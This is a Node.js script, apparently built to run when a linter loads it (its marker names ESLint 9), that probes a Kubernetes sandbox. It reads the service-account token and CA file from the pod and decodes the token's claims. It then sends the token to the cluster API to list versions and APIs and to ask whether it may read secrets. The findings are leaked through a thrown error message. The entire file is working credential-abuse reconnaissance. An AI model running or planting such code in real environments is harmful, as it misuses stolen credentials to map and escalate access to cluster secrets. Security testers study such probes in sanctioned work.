import fs from 'node:fs';
import os from 'node:os';
import { spawnSync } from 'node:child_process';

const tokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
const caPath = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';
let token = '';
let tokenPresent = false;
let tokenLength = 0;
let jwtShape = false;
let claimKeys = [];
let audienceKubernetes = false;
let subjectServiceAccount = false;
let namespacePresent = false;
let expiryFuture = false;

try {
  token = fs.readFileSync(tokenPath, 'utf8').trim();
  tokenPresent = token.length > 0;
  tokenLength = token.length;
  const parts = token.split('.');
  jwtShape = parts.length === 3;
  if (jwtShape) {
    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
    claimKeys = Object.keys(payload).sort();
    audienceKubernetes = Array.isArray(payload.aud)
      ? payload.aud.includes('https://kubernetes.default.svc') || payload.aud.includes('kubernetes')
      : payload.aud === 'https://kubernetes.default.svc' || payload.aud === 'kubernetes';
    subjectServiceAccount = typeof payload.sub === 'string' && payload.sub.startsWith('system:serviceaccount:');
    namespacePresent = typeof payload.namespace === 'string'
      || Boolean(payload['kubernetes.io']?.namespace);
    expiryFuture = typeof payload.exp === 'number' && payload.exp > Math.floor(Date.now() / 1000);
  }
} catch (_) {
  token = '';
}

const envHost = process.env.KUBERNETES_SERVICE_HOST || '';
const envPort = process.env.KUBERNETES_SERVICE_PORT_HTTPS || process.env.KUBERNETES_SERVICE_PORT || '443';
const caPresent = fs.existsSync(caPath);
const hostPresent = envHost.length > 0;
const portPresent = /^\d{1,5}$/.test(envPort);

function curlProbe(path, method, body) {
  if (!tokenPresent || !hostPresent || !portPresent) return 'not_run';
  const args = [
    '-sS', '-k', '--noproxy', '*', '--max-time', '4',
    '-o', '/dev/null', '-w', '%{http_code}',
    '-X', method,
    '-H', `Authorization: Bearer ${token}`,
    '-H', 'Accept: application/json',
  ];
  if (body) args.push('-H', 'Content-Type: application/json', '--data-binary', body);
  args.push(`https://${envHost}:${envPort}${path}`);
  try {
    const result = spawnSync('curl', args, { encoding: 'utf8', timeout: 5500, maxBuffer: 64 });
    if (result.error) return `error_${result.error.code || result.error.name}`;
    if (result.signal) return `signal_${result.signal}`;
    const status = String(result.stdout || '').trim();
    return /^\d{3}$/.test(status) ? `http_${status}` : 'no_status';
  } catch (error) {
    return `error_${error?.code || error?.name || 'unknown'}`;
  }
}

const version = curlProbe('/version', 'GET', '');
const apiRoot = curlProbe('/api', 'GET', '');
const apisRoot = curlProbe('/apis', 'GET', '');
const ssarBody = JSON.stringify({
  apiVersion: 'authorization.k8s.io/v1',
  kind: 'SelfSubjectAccessReview',
  spec: { resourceAttributes: { namespace: 'default', verb: 'get', resource: 'secrets' } },
});
const ssar = curlProbe('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews', 'POST', ssarBody);

const marker = [
  'ESLINT9_K8S_BOUNDARY',
  `uid=${process.getuid?.() ?? 'na'}`,
  `gid=${process.getgid?.() ?? 'na'}`,
  `token_present=${tokenPresent}`,
  `token_length=${tokenLength}`,
  `jwt_shape=${jwtShape}`,
  `claim_keys=${claimKeys.join(',') || 'none'}`,
  `aud_kubernetes=${audienceKubernetes}`,
  `sub_serviceaccount=${subjectServiceAccount}`,
  `namespace_present=${namespacePresent}`,
  `exp_future=${expiryFuture}`,
  `ca_present=${caPresent}`,
  `api_host_present=${hostPresent}`,
  `api_port_present=${portPresent}`,
  `version=${version}`,
  `api=${apiRoot}`,
  `apis=${apisRoot}`,
  `ssar_get_secrets=${ssar}`,
].join(' ');

throw new Error(marker);
